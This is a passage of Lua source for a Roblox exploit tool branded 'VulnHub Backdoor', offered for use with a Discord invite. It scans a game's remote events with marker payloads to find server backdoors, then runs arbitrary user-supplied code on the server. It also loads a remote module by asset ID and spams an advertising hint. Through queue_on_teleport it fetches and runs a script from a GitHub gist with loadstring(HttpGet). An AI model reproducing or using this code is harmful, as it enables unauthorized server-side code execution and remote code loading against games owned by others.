				Region3int16 = { new = "function" },
				RotationCurveKey = { new = "function" },
				task = {
					cancel = "function", defer = "function", delay = "function",
					desynchronize = "function", spawn = "function", synchronize = "function",
					wait = "function",
				},
				TweenInfo = { new = "function" },
				UDim = { new = "function" },
				UDim2 = { fromOffset = "function", fromScale = "function", new = "function" },
				Vector2 = { new = "function", one = "Vector2", xAxis = "Vector2", yAxis = "Vector2", zero = "Vector2" },
				Vector2int16 = { new = "function" },
				Vector3 = {
					fromAxis = "function", FromAxis = "function", fromNormalId = "function",
					FromNormalId = "function", new = "function", one = "Vector3",
					xAxis = "Vector3", yAxis = "Vector3", zAxis = "Vector3", zero = "Vector3",
				},
				Vector3int16 = { new = "function" },
			},
		}
		local enumLibraryTable = language.libraries.Enum
		for _, enum in ipairs(Enum:GetEnums()) do
			enumLibraryTable[tostring(enum)] = "Enum"
		end
		return language
	end,
}

if LocalPlayer then
	pcall(function()
		local thumb = Players:GetUserThumbnailAsync(
			LocalPlayer.UserId,
			Enum.ThumbnailType.HeadShot,
			Enum.ThumbnailSize.Size150x150
		)
		if thumb then
			avatarLabel.Image = thumb
		end
	end)
end

local iconAnimating = false
local function setIconWiggle(iconText: string, animate: boolean)
	statusIcon.Text = iconText
	statusIcon.Visible = true
	statusIcon.Rotation = 0
	iconAnimating = animate
	if not animate then return end
	task.spawn(function()
		while iconAnimating and statusIcon and statusIcon.Parent and statusIcon.Visible do
			local t1 = TweenService:Create(statusIcon, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Rotation = -14 })
			t1:Play()
			t1.Completed:Wait()
			if not iconAnimating or not statusIcon.Visible then break end
			local t2 = TweenService:Create(statusIcon, TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Rotation = 14 })
			t2:Play()
			t2.Completed:Wait()
		end
		if statusIcon and statusIcon.Parent then
			statusIcon.Rotation = 0
		end
	end)
end

exitButton.MouseButton1Click:Connect(function()
	iconAnimating = false
	if G2L["1"] then
		G2L["1"]:Destroy()
	end
end)

task.spawn(function()
	local Highlighter = require(G2L["13"])
	Highlighter.highlight({
		textObject = G2L["11"],
	})
	local textbox = G2L["11"]
	textbox.InputChanged:Connect(function()
		if textbox.Text ~= "" then
			textbox.TextTransparency = 1
			return
		end
		textbox.TextTransparency = 0
	end)
end)

task.spawn(function()
	local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
	if queueteleport then
		pcall(function()
			queueteleport("loadstring(game:HttpGet('https://gist.githubusercontent.com/hnghiaroblox-oss/5b528af198b63dcecde3118f5d6513a9/raw'))()")
		end)
	end

	local GUI = G2L["2"]
	local alphabet = {
		"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
		"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
	}

	local backdoor = nil
	local dynamicRemotes = {}
	local dynamicSeen = {}

	local function debugLog(text, lvl)
		local func = print
		if lvl == 1 then func = print end
		if lvl == 2 then func = error end
		if lvl == 3 then func = warn end
		func("VulnHub Backdoor: " .. tostring(text))
	end

	local function isRemoteInstance(inst: Instance): boolean
		return inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")
	end

	local function shouldSkipRemote(remote: Instance): boolean
		local fullName = remote:GetFullName()
		local topService = string.split(fullName, ".")[1]
		if topService == "RobloxReplicatedStorage" then
			return true
		end

		local parent = remote.Parent
		local p2 = parent and parent.Parent
		local p3 = p2 and p2.Parent

		if parent == ReplicatedStorage or p2 == ReplicatedStorage or p3 == ReplicatedStorage then
			if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
				return true
			end
			if p2 and p2.Name == "HDAdminClient" and parent and parent.Name == "Signals" then
				return true
			end
			if parent and parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end

		return false
	end

	-- Track late-spawned remotes after initial load
	game.DescendantAdded:Connect(function(desc)
		if isRemoteInstance(desc) and not dynamicSeen[desc] and not shouldSkipRemote(desc) then
			dynamicSeen[desc] = true
			table.insert(dynamicRemotes, desc)
			debugLog("Queued late remote: " .. desc:GetFullName(), 1)
		end
	end)

	local function sendPayload(remote: Instance, ...)
		local args = { ... }
		if remote:IsA("RemoteEvent") then
			pcall(function()
				remote:FireServer(table.unpack(args))
			end)
		elseif remote:IsA("RemoteFunction") then
			task.spawn(function()
				pcall(function()
					remote:InvokeServer(table.unpack(args))
				end)
			end)
		end
	end

	local function setExecutorVisible(state: boolean)
		G2L["16"].Visible = not state
		G2L["f"].Visible = state
		G2L["7"].Visible = state
		G2L["b"].Visible = state
	end

	local function notify(text)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = "VulnHub Backdoor",
				Duration = 6,
				Text = tostring(text),
			})
		end)
	end

	setExecutorVisible(false)
	G2L["16"].Visible = true
	GUI.Visible = true

	local function generateName(length)
		local text = ""
		for _ = 1, length do
			text = text .. alphabet[math.random(1, #alphabet)]
		end
		return text
	end

	local function collectCandidateRemotes()
		local ordered = {}
		local seen = {}

		local priorityRoots = { ReplicatedStorage, workspace, SoundService, Lighting, Players }
		for _, root in ipairs(priorityRoots) do
			for _, desc in ipairs(root:GetDescendants()) do
				if isRemoteInstance(desc) and not seen[desc] and not shouldSkipRemote(desc) then
					seen[desc] = true
					table.insert(ordered, desc)
				end
			end
		end

		for _, desc in ipairs(game:GetDescendants()) do
			if isRemoteInstance(desc) and not seen[desc] and not shouldSkipRemote(desc) then
				seen[desc] = true
				table.insert(ordered, desc)
			end
		end

		for _, desc in ipairs(dynamicRemotes) do
			if desc and desc.Parent and not seen[desc] and not shouldSkipRemote(desc) then
				seen[desc] = true
				table.insert(ordered, desc)
			end
		end

		return ordered
	end

	local code
	local function findRemote()
		local timee = os.clock()
		local remotes = {}
		local probesSent = 0

		local protectedName = "lh" .. tostring(game.PlaceId / 6666 * 1337 * game.PlaceId)
		local protected_backdoor = ReplicatedStorage:FindFirstChild(protectedName)
		if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
			while true do
				code = generateName(math.random(12, 30))
				if not remotes[code] then break end
			end
			local markerSnippet = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
			task.spawn(function()
				pcall(function()
					protected_backdoor:InvokeServer("VulnHub Hub | https://discord.gg/HbQrwAdA5", markerSnippet)
				end)
			end)
			remotes[code] = protected_backdoor
		end

		local candidates = collectCandidateRemotes()
		statusLabel.Text = "Probing " .. tostring(#candidates) .. " remotes across containers..."

		for _, remote in ipairs(candidates) do
			local markerCode
			while true do
				markerCode = generateName(math.random(12, 30))
				if not remotes[markerCode] then break end
			end

			local payload = "a=Instance.new('Model',workspace)a.Name='" .. markerCode .. "'"
			-- Probe 1: direct single-string payload
			sendPayload(remote, payload)
			-- Probe 2: common action + code argument pair
			sendPayload(remote, "Run", payload)
			-- Probe 3: dictionary table payload
			sendPayload(remote, { Code = payload })

			remotes[markerCode] = remote
			probesSent += 1
			debugLog('Sent probes to "' .. remote:GetFullName() .. '"', 1)

			-- Pace bursts to stay comfortably below ~500 FireServer calls/sec throttling
			if probesSent % 25 == 0 then
				task.wait(0.05)
			end
		end

		for _ = 1, 140 do
			for remoteCode, remote in pairs(remotes) do
				local foundModel = workspace:FindFirstChild(remoteCode)
				if foundModel then
					pcall(function()
						foundModel:Destroy()
					end)
					local elapsed = string.format("%.2f", os.clock() - timee)
					notify("Backdoor found! " .. elapsed .. "s")
					statusLabel.Text = "Backdoor found in " .. elapsed .. "s — Executor ready"
					statusLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
					setIconWiggle("✅", false)

					backdoor = remote
					debugLog("Matched: " .. remote:GetFullName(), 3)
					setExecutorVisible(true)

					sendPayload(remote, "require(171016405.1884*69)")
					sendPayload(remote, "a=Instance.new('Hint')a.Text='VulnHub Backdoor | https://discord.gg/HbQrwAdA5 | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
					return true
				end
			end
			task.wait()
		end

		return false
	end

	G2L["8"].MouseButton1Click:Connect(function()
		local playerName = LocalPlayer and LocalPlayer.Name or ""
		local scriptText = string.gsub(G2L["11"].Text, "%%username%%", playerName)
		local protectedName = "lh" .. tostring(game.PlaceId / 6666 * 1337 * game.PlaceId)
		local protected_backdoor = ReplicatedStorage:FindFirstChild(protectedName)

		if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
			debugLog("Protected backdoor found", 3)
			task.spawn(function()
				local ok, variantValue = pcall(function()
					return protected_backdoor:InvokeServer("VulnHub Hub | https://discord.gg/HbQrwAdA5", scriptText)
				end)
				if ok and variantValue ~= nil then
					local splited = string.split(tostring(variantValue), ":")
					notify(splited[#splited])
				end
			end)
		else
			sendPayload(backdoor, scriptText)
		end

		G2L["8"].Text = "Executed!"
		task.wait(0.5)
		G2L["8"].Text = "Execute"
	end)

	G2L["c"].MouseButton1Click:Connect(function()
		G2L["11"].Text = ""
		G2L["c"].Text = "Cleared!"
		task.wait(0.5)
		G2L["c"].Text = "Clear"
	end)

	local searching = false
	G2L["1a"].MouseButton1Click:Connect(function()
		if searching then return end
		searching = true
		debugLog("Deep scanning...", 3)
		G2L["1a"].Text = "Scanning..."
		statusLabel.Text = "Scanning priority & dynamic remotes..."
		statusLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
		setIconWiggle("⏳", true)

		if not findRemote() then
			G2L["1a"].Text = "Start Deep Scan"
			statusLabel.Text = "No backdoor found in this game"
			statusLabel.TextColor3 = Color3.fromRGB(255, 90, 90)
			setIconWiggle("⚠️", true)
			searching = false
		end
	end)

	UserInputService.InputBegan:Connect(function(input, processed)
		if input.KeyCode == Enum.KeyCode.LeftAlt and not processed and GUI and GUI.Parent then
			GUI.Visible = not GUI.Visible
		end
	end)
end)

task.spawn(function()
	local frame = G2L["2"]
	local dragToggle = false
	local dragInput = nil
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local targetPos = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
		TweenService:Create(frame, TweenInfo.new(0.15), { Position = targetPos }):Play()
	end

	topBar.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch)
			and UserInputService:GetFocusedTextBox() == nil
		then
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	topBar.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end)

return G2L["1"], require
